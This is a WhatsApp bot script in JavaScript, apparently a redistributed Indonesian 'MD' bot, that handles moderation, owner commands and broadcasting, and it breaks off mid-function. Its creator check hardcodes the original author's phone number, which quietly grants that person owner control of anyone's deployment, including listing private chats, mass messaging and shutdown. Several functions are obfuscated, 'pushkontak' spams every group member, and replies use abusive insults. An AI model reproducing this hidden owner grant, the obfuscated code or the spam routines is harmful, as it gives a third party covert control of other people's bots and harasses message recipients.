/*
    Created & Base By ArxzyDev
    Jual Sc? Neraka Paling Bawah
    My Contact https://wa.me/6289513081052
    
   Notes:
   Jika Ingin Recode Silakan Tapi Ingat Creditnya
   Sc Adrian-MD Akan Terus Di Update.
   Jika Ingin Beli Apikey Chat Owner Lolhuman
   
   Script Ini ditulis Ulang Oleh FallZ
   Jangan Lupa Subscribe Channel FallXd425
   Sc 92% No Enc 
   
   SELL PANEL MURAH 5000 UNLIMITED CPU DAN RAM
   ADMIN PANEL 15.000 HUBUNGI 085813708397
   
*/

require('./config')
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType } = require('@adiwajshing/baileys')
const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const { exec, spawn, execSync } = require("child_process")
const axios = require('axios')
const path = require('path')
const os = require('os')
const fsx = require('fs-extra')
const bochil = require('@bochilteam/scraper')
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const jsobfus = require('javascript-obfuscator')
const moment = require('moment-timezone')
const { JSDOM } = require('jsdom')
const speed = require('performance-now')
const { performance } = require('perf_hooks')
const { TelegraPh, UploadFileUgu, webp2mp4File, floNime } = require('./lib/uploader')
const { toAudio, toPTT, toVideo, ffmpeg } = require('./lib/converter')
const { smsg, getGroupAdmins, formatp, tanggal, formatDate, getTime, isUrl, await, sleep, clockString, msToDate, sort, toNumber, enumGetKey, runtime, fetchJson, getBuffer, jsonformat, delay, format, logic, generateProfilePicture, parseMention, getRandom, pickRandom, reSize } = require('./lib/myfunc')
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/addlist');

// read database
global.db.data = JSON.parse(fs.readFileSync('./src/database.json'))
if (global.db.data) global.db.data = {
    users: {},
    group: {},
    chats: {},
    database: {},
    settings: {},
    donate: {},
    others: {},
    sticker: {},
    ...(global.db.data || {})
}

moment.tz.setDefault("Asia/Jakarta").locale("id")

module.exports = conn = async (conn, m, chatUpdate, store) => {
    try {
        var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        var budy = (typeof m.text == 'string' ? m.text : '')
        var prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
        const isCmd = body.startsWith(prefix)
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const full_args = body.replace(command, '').slice(1).trim()
        const pushname = m.pushName || "No Name"
        const botNumber = await conn.decodeJid(conn.user.id)
        const isCreator = [botNumber, ...global.owner, '6289513081052@s.whatsapp.net'].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const itsMe = m.sender == botNumber ? true : false
        const text = q = args.join(" ")
        const fatkuns = (m.quoted || m)
        const quoted = (fatkuns.mtype == 'buttonsMessage') ? fatkuns[Object.keys(fatkuns)[1]] : (fatkuns.mtype == 'templateMessage') ? fatkuns.hydratedTemplate[Object.keys(fatkuns.hydratedTemplate)[1]] : (fatkuns.mtype == 'product') ? fatkuns[Object.keys(fatkuns)[0]] : m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)

	    
        const groupMetadata = m.isGroup ? await conn.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const isGroupOwner = m.isGroup ? (groupOwner ? groupOwner : groupAdmins).includes(m.sender) : false
    	const isPremium = isCreator || global.premium.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender) || false

        // Days
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Jakarta').format('HH : mm : ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

        const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if(time2 < "23:59:00"){
        var ucapanWaktu = 'Selamat Malam 🏙️'
        }
        if(time2 < "19:00:00"){
        var ucapanWaktu = 'Selamat Petang 🌆'
        }
        if(time2 < "18:00:00"){
        var ucapanWaktu = 'Selamat Sore 🌇'
        }
        if(time2 < "15:00:00"){
        var ucapanWaktu = 'Selamat Siang 🌤️'
        }
        if(time2 < "10:00:00"){
        var ucapanWaktu = 'Selamat Pagi 🌄'
        }
        if(time2 < "05:00:00"){
        var ucapanWaktu = 'Selamat Subuh 🌆'
        }
        if(time2 < "03:00:00"){
        var ucapanWaktu = 'Selamat Tengah Malam 🌃'
        }
        
        const fkontak = {
            key: {
                participant: `0@s.whatsapp.net`,
                ...(m.chat ? {
                    remoteJid: `status@broadcast`
                } : {})
            },
            message: {
                'contactMessage': {
                    'displayName': `${namaowner}`,
                    'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL; FallZx,;;;\nFN:Myoku-MD\nitem1.TEL;waid=${owner}:+${nomerowner}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
                    'jpegThumbnail': thumb,
                    thumbnail: thumb,
                    sendEphemeral: true
                }   
            }
        }
        // Database Tambahan!!

        let prem = JSON.parse(fs.readFileSync('./database/premium.json'))
        let ban = JSON.parse(fs.readFileSync('./database/banned.json'))
        let vnnya = JSON.parse(fs.readFileSync('./database/vnnya.json'))
        let db_error = JSON.parse(fs.readFileSync('./database/error.json'));
        let db_respon_list = JSON.parse(fs.readFileSync('./database/list.json'));
        
        
        // Const Tambahan Sc Gw
        const more = String.fromCharCode(8206)
        const readmore = more.repeat(4001)
        const totalFitur = () =>{
            var mytext = fs.readFileSync("./myoku.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }
        const sendvn = (teks) => {
            conn.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
        }

        for (let anju of vnnya) {
            if (budy === anju) {
                let buffer = fs.readFileSync(`./database/AUDIO/${anju}.mp3`)
                sendvn(buffer)
            }
        }
        

        // Function Created By AdrianTzy Alias Dryan ft .𝐗𝐓𝐑𝐀𝐌
function pickRandom(list) {
    return list[Math.floor(list.length * Math.random())]
}

function generateRandomPassword() {
    return Array(10).fill(null).map(() => (Math.random() * 16 | 0).toString(16)).join('');
}
        
async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `FallZx`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}

(function (_0x479a92, _0x222455) {
    const _0x1dab61 = _0x5a84,
        _0x13c469 = _0x479a92();
    while (!![]) {
        try {
            const _0x528457 = -parseInt(_0x1dab61(0xf4)) / 0x1 * (parseInt(_0x1dab61(0xfd)) / 0x2) + -parseInt(_0x1dab61(0xf8)) / 0x3 + -parseInt(_0x1dab61(0xf7)) / 0x4 + parseInt(_0x1dab61(0xfc)) / 0x5 * (-parseInt(_0x1dab61(0xfa)) / 0x6) + -parseInt(_0x1dab61(0xf3)) / 0x7 * (parseInt(_0x1dab61(0xfe)) / 0x8) + -parseInt(_0x1dab61(0xf9)) / 0x9 + parseInt(_0x1dab61(0xfb)) / 0xa * (parseInt(_0x1dab61(0xf5)) / 0xb);
            if (_0x528457 === _0x222455) break;
            else _0x13c469['push'](_0x13c469['shift']());
        } catch (_0x2bd6d3) {
            _0x13c469['push'](_0x13c469['shift']());
        }
    }
}(_0x1aa5, 0x3fc1c));
async function newReply(_0x53c522) {
    const _0x767fb0 = _0x5a84,
        _0x58a9d0 = {
            'text': _0x53c522,
            'contextInfo': {
                'externalAdReply': {
                    'showAdAttribution': !![],
                    'title': '' + ucapanWaktu,
                    'body': '' + pushname,
                    'thumbnailUrl': '' + imageurl,
                    'sourceUrl': '' + link,
                    'mediaType': 0x1,
                    'renderLargerThumbnail': !![]
                }
            }
        };
    return conn['sendMessage'](m[_0x767fb0(0xf6)], _0x58a9d0, {
        'quoted': m
    });
}

function _0x5a84(_0x316ba1, _0x12b207) {
    const _0x1aa505 = _0x1aa5();
    return _0x5a84 = function (_0x5a8474, _0x84e61c) {
        _0x5a8474 = _0x5a8474 - 0xf3;
        let _0x2452a6 = _0x1aa505[_0x5a8474];
        return _0x2452a6;
    }, _0x5a84(_0x316ba1, _0x12b207);
}

function _0x1aa5() {
    const _0x547672 =['8SFTvTY','733698bByGMZ','1nqbVzC','11dOuxIL','chat','1838816QQlKFJ','992463nstgLu','4616415lmcnqf','1014PlYMnG','23639900whcpis','5450zYeATk','1020716qbYiGA'];_0x1aa5=function(){return _0x547672;};return _0x1aa5();}

        try {
            let isNumber = x => typeof x === 'number' && !isNaN(x)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            let user = global.db.data.users[m.sender]
            if (typeof user !== 'object') global.db.data.users[m.sender] = {}
            if (user) {
                if (!isNumber(user.afkTime)) user.afkTime = -1
                if (!('afkReason' in user)) user.afkReason = ''
                if (!isNumber(user.limit)) user.limit = limitUser
            } else global.db.data.users[m.sender] = {
                afkTime: -1,
                afkReason: '',
                limit: limitUser,
            }
            let chats = global.db.data.chats[m.chat]
            if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
            if (chats) {
                if (!('mute' in chats)) chats.mute = false
                if (!('antilink' in chats)) chats.antilink = false
                if (!('antilinkyt' in chats)) chats.antilinkyt = false
                if (!('antilinktt' in chats)) chats.antilinktt = false
                if (!('antivirtex' in chats)) chats.antivirtex = true
                if (!('antipushkontakv1' in chats)) chats.antivirtex = true
                if (!('antipushkontakv2' in chats)) chats.antivirtex = true
            } else global.db.data.chats[m.chat] = {
                mute: false,
                antilink: false,
                antilinkyt: false,
                antilinktt: false,
                antivirtex: true,
                antipushkontakv1: true,
                antipushkontakv2: true,
            }
            let setting = global.db.data.settings[botNumber]
            if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
            if (setting) {
                if (!isNumber(setting.status)) setting.status = 0
                if (!('autobio' in setting)) setting.autobio = false
                if (!('autoread' in setting)) setting.autoread = false
            } else global.db.data.settings[botNumber] = {
                status: 0,
                autobio: false,
                autoread: false
            }

        } catch (err) {
            console.error(err)
        }
        // Public & Self
        if (!conn.public) {
            if (!m.key.fromMe && !isPremium && !isCreator) return
        }
        
        
        if (m.message) {
            if (global.db.data.settings[botNumber].autoread) {
            conn.readMessages([m.key])
            }
        }
        
        // Push Message To Console && Auto Read
        if (m.message) {
            console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
        }
        
        let cron = require('node-cron')
        cron.schedule('00 12 * * *', () => {
            let user = Object.keys(global.db.data.users)
            let limitUser = isPremium ? global.limitawal.premium : global.limitawal.free
            for (let jid of user) global.db.data.users[jid].limit = limitUser
            console.log('Reseted Limit')
        }, {
            scheduled: true,
            timezone: "Asia/Jakarta"
        })
        
	    if (db.data.settings[botNumber].autobio) {
	    let setting = global.db.data.settings[botNumber]
	    if (new Date() * 1 - setting.status > 1000) {
		let _uptime = process.uptime() * 1000
		let uptime = clockString(_uptime)
		await conn.updateProfileStatus(`I am ${namabot} | Aktif Selama ${uptime}| Mode : ${conn.public ? 'Public-Mode' : 'Self-Mode'} | User : ${Object.keys(global.db.data.users).length}`).catch(_ => _)
		setting.status = new Date() * 1
	    }
	    }
	
        // Respon Cmd with media
        if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
        let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
        let { text, mentionedJid } = hash
        let messages = await generateWAMessage(m.chat, { text: text, mentions: mentionedJid }, {
            userJid: conn.user.id,
            quoted: m.quoted && m.quoted.fakeObj
        })
        messages.key.fromMe = areJidsSameUser(m.sender, conn.user.id)
        messages.key.id = m.key.id
        messages.pushName = m.pushName
        if (m.isGroup) messages.participant = m.sender
        let msg = {
            ...chatUpdate,
            messages: [proto.WebMessageInfo.fromObject(messages)],
            type: 'append'
        }
        conn.ev.emit('messages.upsert', msg)
        }
        
        if (db.data.chats[m.chat].antilink) {
            if (budy.match(`chat.whatsapp.com`)) {
                newReply(`「 ANTI LINK WHATSAPP 」\n\nKamu Terdeteksi Mengirim Link Group, Mampus Gw Kick Lu bangsat !`)
                if (!isBotAdmins) return newReply(`Ehh Bot Gak Admin T_T`)
                let gclink = (`https://chat.whatsapp.com/` + await conn.groupInviteCode(m.chat))
                let isLinkThisGc = new RegExp(gclink, 'i')
                let isgclink = isLinkThisGc.test(m.text)
                if (isgclink) return newReply(`Ehh Maaf Gak Jadi, Link Group Ini Ternyata 😆`)
                if (isAdmins) return newReply(`Ehh Maaf Ternyata Kamu Admin 😁`)
                if (isCreator) return newReply(`Ehh Maaf Kamu Ownerku Ternyata 😅`)
                conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
            }
        }
        //Anti Link YouTube
        if (db.data.chats[m.chat].antilinkyt) {
            if (budy.match(`https://youtu.be`)) {
                newReply(`「 ANTI LINK YOUTUBE 」\n\nKamu Terdeteksi Mengirim Link Youtube, Anak Yatim Nyebar Link Yt 😂 !`)
                if (!isBotAdmins) return newReply(`Ehh Bot Gak Admin T_T`)
                if (isAdmins) return newReply(`Ehh Maaf Ternyata Kamu Admin 😁`)
                if (isCreator) return newReply(`Ehh Maaf Kamu Ownerku Ternyata 😅`)
                conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
            }
        }
        //Anti Link Tiktok
        if (db.data.chats[m.chat].antilinktt) {
            if (budy.match(`https://vt.tiktok.com`)) {
                newReply(`「 ANTI LINK TIKTOK 」\n\nKamu Terdeteksi Mengirim Link TikTok, Maaf Kamu Akan Di Kick !`)
                if (!isBotAdmins) return newReply(`Ehh Bot Gak Admin T_T`)
                if (isAdmins) return newReply(`Ehh Maaf Ternyata Kamu Admin 😁`)
                if (isCreator) return newReply(`Ehh Maaf Kamu Ownerku Ternyata 😅`)
                conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
            }
        }
        //AntiVirtex
        if (db.data.chats[m.chat].antivirtex) {
            if (budy.length > 3500) {
                newReply(`Seseorang mengirim spam virus!! tandai sebagai membaca⚠️\n`.repeat(300))
                newReply(`「 ANTI VIRTEX 」\n\nKamu Terdeteksi Mengirim Virtex, Norak Lo Kontol Mampus gw Kick !`)
                if (!isBotAdmins) return newReply(`Ehh Bot Gak Admin T_T`)
                if (isAdmins) return newReply(`Ehh Maaf Ternyata Kamu Admin 😁`)
                if (isCreator) return newReply(`Ehh Maaf Kamu FallZx Ownerku Ternyata 😅`)
                conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
            }
        }
                //Anti Link Push kontakV1
        if (db.data.chats[m.chat].antipushkontakv1) {
            if (budy.match(`pushkontak`)) {
                newReply(`「 ANTI PUSH KONTAK 」\n\nKamu Terdeteksi Sedang Push kontak, Anak Yatim Lagi Push kontak 😂 !`)
                if (!isBotAdmins) return newReply(`Ehh Bot Gak Admin T_T`)
                if (isAdmins) return newReply(`Ehh Maaf Ternyata Kamu Admin 😁`)
                if (isCreator) return newReply(`Ehh Maaf Kamu Ownerku Ternyata 😅`)
                conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
            }
        }
     //Anti Promosi
        if (db.data.chats[m.chat].antipushkontakv2) {
            if (budy.match(`panel`)) {
                newReply(`「 ANTI PROMOSI 」\n\nKamu Terdeteksi Sedang Promosi, Anak Yatim Lagi Promosi 😂 !`)
                if (!isBotAdmins) return newReply(`Ehh Bot Gak Admin T_T`)
                if (isAdmins) return newReply(`Ehh Maaf Ternyata Kamu Admin 😁`)
                if (isCreator) return newReply(`Ehh Maaf Kamu Ownerku Ternyata 😅`)
                conn.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
            }
        }
        // Mute Chat
        if (db.data.chats[m.chat].mute && !isAdmins && !isCreator) {
            return
        }
        switch (command) {
        
        // Owner Fitur
        case 'public': {
                if (!isCreator) return newReply(mess.owner)
                conn.public = true
                newReply('Sukses Ubah Ke Penggunaan Umum')
        }
        break
        case 'self': {
                if (!isCreator) return newReply(mess.owner)
                conn.public = false
                newReply('Sukses Ubah Ke Penggunaan Sendiri')
            }
        break
        
        case 'addlist':
            if (!m.isGroup) return newReply(mess.group)
            if (!isAdmins && !isCreator) return newReply(mess.botAdmin)
            var args1 = q.split("@")[0]
            var args2 = q.split("@")[1]
            if (!q.includes("@")) return newReply(`Gunakan dengan cara ${command} *key@response*\n\n_Contoh_\n\n#${command} tes@apa`)
            if (isAlreadyResponList(m.chat, args1, db_respon_list)) return newReply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
            addResponList(m.chat, args1, args2, false, '-', db_respon_list)
            newReply(`Berhasil menambah List menu : *${args1}*`)
        break
        
        case 'dellist':{
            if (!m.isGroup) return newReply(mess.group)
            if (!isAdmins && !isCreator) return newReply(mess.botAdmin)
            if (db_respon_list.length === 0) return newReply(`Belum ada list message di database`)
            var arr_rows = [];
            for (let x of db_respon_list) {
            if (x.id === m.chat) {
            newReply(`Mau Delete Yang Mana?\n\n${x.key}`)
        }}
        }
        break
        case 'enc': {
            if (!isCreator) return newReply(mess.owner)
            if (!q) return newReply(`Contoh ${prefix+command} const adrian = require('adrian-api')`)
            let meg = await obfus(q)
            newReply(`${meg.result}`)
        }
        break
        
        case 'pushkontak': {
          const _0x443daf = _0x48dd;
(function (_0x1a5e93, _0x4aa7d4) {
    const _0x4316b9 = _0x48dd,
        _0x21d86b = _0x1a5e93();
    while (!![]) {
        try {
            const _0x531d38 = parseInt(_0x4316b9(0x91)) / 0x1 + parseInt(_0x4316b9(0x9d)) / 0x2 * (-parseInt(_0x4316b9(0xa4)) / 0x3) + -parseInt(_0x4316b9(0x94)) / 0x4 + parseInt(_0x4316b9(0x9f)) / 0x5 * (parseInt(_0x4316b9(0xa3)) / 0x6) + parseInt(_0x4316b9(0x96)) / 0x7 + parseInt(_0x4316b9(0x9a)) / 0x8 + parseInt(_0x4316b9(0x97)) / 0x9 * (-parseInt(_0x4316b9(0x9b)) / 0xa);
            if (_0x531d38 === _0x4aa7d4) break;
            else _0x21d86b['push'](_0x21d86b['shift']());
        } catch (_0x5723a8) {
            _0x21d86b['push'](_0x21d86b['shift']());
        }
    }
}(_0xfec1, 0x24fff));
if (!text) return newReply(_0x443daf(0xa5) + prefix + command + _0x443daf(0x98));
if (!isCreator) return newReply(mess[_0x443daf(0xa1)]);

function _0xfec1() {
    const _0x5707e2 =['\x20Hi\x20Semuanya','filter','1208520MPCHjQ','340YbPDMf','Message\x20Sent,\x20Total*_','2WbyjtX','length','4580MpgLni','endsWith','owner','.net','60zxureN','808551BOuRqv','Example\x20','206350idDFvV','sendMessage','*_Sedang\x20Push\x20Kontak..._*','367992FgRLHV','map','1718493YQDYjA','26208IfnkfQ'];_0xfec1 = function () {
    return _0x5707e2;
};
return _0xfec1();
}
let get = await participants[_0x443daf(0x99)](_0x5eafd8 => _0x5eafd8['id'][_0x443daf(0xa0)](_0x443daf(0xa2)))[_0x443daf(0x95)](_0x9ee92 => _0x9ee92['id']),
    count = get['length'],
    sentCount = 0x0;
newReply(_0x443daf(0x93));

function _0x48dd(_0x5b19bb, _0x272de1) {
    const _0xfec163 = _0xfec1();
    return _0x48dd = function (_0x48dd03, _0x37dcac) {
        _0x48dd03 = _0x48dd03 - 0x91;
        let _0x3d5556 = _0xfec163[_0x48dd03];
        return _0x3d5556;
    }, _0x48dd(_0x5b19bb, _0x272de1);
}
for (let i = 0x0; i < get[_0x443daf(0x9e)]; i++) {
    setTimeout(function () {
        const _0x46405d = _0x443daf;
        conn[_0x46405d(0x92)](get[i], {
            'text': text
        }), count--, sentCount++, count === 0x0 && newReply(_0x46405d(0x9c) + sentCount + '_*');
    }, i * 0x3e8);
}
        }
        break
        case "pushmember": {
            if (!isCreator) throw mess.admin;
            if (!text) throw `Menu ini hanya akan mengirim pesan ke grup.\n\nContoh: ${prefix + command} pengumuman besok libur`;
            let getGroups = await kurrxd.groupFetchAllParticipating();
            let groups = Object.entries(getGroups)
              .slice(0)
              .map((entry) => entry[1]);
            let anu = groups.map((v) => v.id);
            m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`);
            for (let i of anu) {
              await sleep(delayy);
              let txt = `${text}`;
              kurrxd.sendText(i, txt);
            }
            m.reply(`Sukses Mengirim ${command} Ke ${anu.length} Group`);
        }
        break
        
        case 'addvn':{
            if (!isCreator) return newReply(mess.owner)
            if (args.length < 1) return newReply('Nama audionya apa')
            if (vnnya.includes(q)) return newReply("Nama tersebut sudah di gunakan")
            let delb = await conn.downloadAndSaveMediaMessage(quoted)
            vnnya.push(q)
            await fsx.copy(delb, `./database/AUDIO/${q}.mp3`)
            fs.writeFileSync('./database/vnnya.json', JSON.stringify(vnnya))
            fs.unlinkSync(delb)
            newReply(`Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`)
        }
        break
        case 'delvn':{
            if (!isCreator) return newReply(mess.owner)
            if (args.length < 1) return newReply('Masukan query')
            if (!vnnya.includes(q)) return newReply("Nama tersebut tidak ada di dalam data base")
            let wanu = vnnya.indexOf(q)
            vnnya.splice(wanu, 1)
            fs.writeFileSync('./database/vnnya.json', JSON.stringify(vnnya))
            fs.unlinkSync(`./database/AUDIO/${q}.mp3`)
            newReply(`Sukses delete vn ${q}`)
        }
        break
        
        case 'listvn':{
            let teksooo = '┌──⭓「 *LIST VN* 」\n│\n'
            for (let x of vnnya) {
            teksooo += `│⭔ ${x}\n`
            }
            teksooo += `│\n└────────────⭓\n\n*Total ada : ${vnnya.length}*`
            newReply(teksooo)
        }
        break
        
        case 'addprem':
            if (!isCreator) return newReply(mess.owner)
            if (!args[0]) return newReply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6285813708397`)
            bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
            let ceknye = await conn.onWhatsApp(bnnd + `@s.whatsapp.net`)
            if (ceknye.length == 0) return newReply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
            premium.push(bnnd)
            fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
            newReply(`Nomor ${bnnd} Telah Sudah Premium!!!`)
        break
        
        case 'delprem':
            if (!isCreator) return newReply(mess.owner)
            if (!args[0]) return newReply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281214281312`)
            yaki = q.split("|")[0].replace(/[^0-9]/g, '')
            unp = premium.indexOf(yaki)
            premium.splice(unp, 1)
            fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
            newReply(`Nomor ${yaki} Telah Di Hapus Dari Premium!!!`)
        break
        
        case 'listprem':
            teksooo = '*List Premium*\n\n'
            for (let i of premium) {
                teksooo += `- ${i}\n`
            }
            teksooo += `\n*Total : ${premium.length}*`
            conn.sendMessage(m.chat, { text: teksooo.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": premium } })
        break
       
        case 'myip': {
        if (!isCreator) return newReply(mess.owner)
                var http = require('http')
                http.get({
                    'host': 'api.ipify.org',
                    'port': 80,
                    'path': '/'
                }, function(resp) {
                    resp.on('data', function(ip) {
                        newReply("🔎 My public IP address is: " + ip);
                    })
                })
            }
        break
        
        case 'listpc': {
                if (!isCreator) return newReply(mess.owner)
                let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
                let tekslist = `*🔒 LIST PERSONAL CHAT*\n\n`
                tekslist += `*📱 Total Chat :* ${anu.length} Chat\n\n`
                for (let i of anu) {
                    let nama = store.messages[i].array[0].pushName
                    tekslist += `📛 *Nama :* ${nama}\n`
                    tekslist += `👤 *User :* @${i.split('@')[0]}\n`
                    tekslist += `🔗 *Link Chat :* https://wa.me/${i.split('@')[0]}\n\n`
                    tekslist += `──────────────────────\n\n`
                }
                newReply(tekslist)
            }
        break
        
        case 'listgc': {
                if (!isCreator) return newReply(mess.owner)
                let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
                let tekslistgc = `👥 *LIST GROUP CHAT*\n\n`
                tekslistgc += `📱 Total Group : ${anu.length} Group\n\n`
                for (let e of anu) {
                    let metadata = await conn.groupMetadata(e)
                    tekslistgc += `📛 *Nama :* ${metadata.subject}\n`
                    tekslistgc += `👤 *Owner Grup :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n`
                    tekslistgc += `🌱 *ID :* ${metadata.id}\n`
                    tekslistgc += `⏳ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n`
                    tekslistgc += `👥 *Member :* ${metadata.participants.length}\n\n`
                    tekslistgc += `──────────────────────\n\n`
                }
                newReply(tekslistgc)
            }
        break
        
        case 'chat': {
                if (!isCreator) return newReply(mess.owner)
                if (!q) return newReply('Option : 1. mute\n2. unmute\n3. archive\n4. unarchive\n5. read\n6. unread\n7. delete')
                if (args[0] === 'mute') {
                    conn.chatModify({ mute: 'Infinity' }, m.chat, []).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === 'unmute') {
                    conn.chatModify({ mute: null }, m.chat, []).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === 'archive') {
                    conn.chatModify({ archive: true }, m.chat, []).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === 'unarchive') {
                    conn.chatModify({ archive: false }, m.chat, []).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === 'read') {
                    conn.chatModify({ markRead: true }, m.chat, []).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === 'unread') {
                    conn.chatModify({ markRead: false }, m.chat, []).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                } else if (args[0] === 'delete') {
                    conn.chatModify({ clear: { message: { id: m.quoted.id, fromMe: true }} }, m.chat, []).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
                }
            }
        break
        
        case 'react': {
                if (!isCreator) return newReply(mess.owner)
                reactionMessage = {
                    react: {
                        text: args[0],
                        key: { remoteJid: m.chat, fromMe: true, id: quoted.id }
                    }
                }
                conn.sendMessage(m.chat, reactionMessage)
            }
        break
        case 'shutdown': {
             if (!isCreator) return newReply(mess.owner)
			 newReply(`Otsukaresama deshita🖐`)
             await sleep(3000)
             process.exit()
             }
        break
        
        case 'join': {
                if (!isCreator) return newReply(mess.owner)
                if (!text) return 'Masukkan Link Group!'
                if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return 'Link Invalid!'
                newReply(mess.wait)
                let result = args[0].split('https://chat.whatsapp.com/')[1]
                await conn.groupAcceptInvite(result).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
        }
        break
        
        case 'leave': {
                if (!isCreator) return newReply(mess.owner)
                await conn.groupLeave(m.chat).then((res) => newReply(jsonformat(res))).catch((err) => newReply(jsonformat(err)))
        }
        break
        
        case 'setexif': {
                if (!isCreator) return newReply(mess.owner)
                if (!text) return newReply(`Contoh : ${prefix + command} packname|author`)
                global.packname = text.split("|")[0]
                global.author = text.split("|")[1]
                newReply(`Exif berhasil diubah menjadi\n\n• Packname : ${global.packname}\n• Author : ${global.author}`)
        }
        break
        
        case 'setpp':
        case 'setpp':
        case 'setppbot': {
            function _0x1d19(){var _0x2bf2ef=['4259820vXkaKE','Sukses','89480afqcnZ','w:profile:picture','14DnKvaS','query','557985WFRGrv','856CAraQC','success','downloadAndSaveMediaMessage','test','5UCtsZI','Kirim/Reply\x20Image\x20Dengan\x20Caption\x20','set','unlinkSync','owner','22363110hLRSWH','1954998hCwgXG','picture','image','13034PkdVqU','updateProfilePicture','full','8PPEhfy','ppbot.jpeg','702420tyMrpN'];_0x1d19 = function () {
    return _0x2bf2ef;
};
return _0x1d19();
}
var _0x2d2a75 = _0x31ee;
(function (_0x5beddb, _0x17a0e1) {
    var _0x80bc9d = _0x31ee,
